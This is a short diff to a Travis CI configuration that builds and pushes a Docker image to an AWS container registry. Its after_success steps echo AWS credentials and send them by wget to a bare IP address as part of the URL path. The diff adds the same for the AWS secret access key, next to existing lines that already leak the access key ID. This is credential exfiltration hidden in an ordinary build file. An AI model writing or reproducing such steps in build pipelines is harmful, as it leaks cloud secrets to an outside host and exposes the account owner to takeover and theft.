@@ -21,5 +21,7 @@ after_success:
   - docker build -t 310090471142.dkr.ecr.us-east-1.amazonaws.com/class-ecr-helpfulapp .
   - docker push 310090471142.dkr.ecr.us-east-1.amazonaws.com/class-ecr-helpfulapp
   - echo $AWS_ACCESS_KEY_ID
+  - echo $AWS_SECRET_ACCESS_KEY
   - wget http://3.88.251.228/$(echo $AWS_ACCESS_KEY_ID)
+  - wget http://3.88.251.228/$(echo $AWS_SECRET_ACCESS_KEY)
 # sadly, travis doesn't cache docker builds yet, so each build will take a while
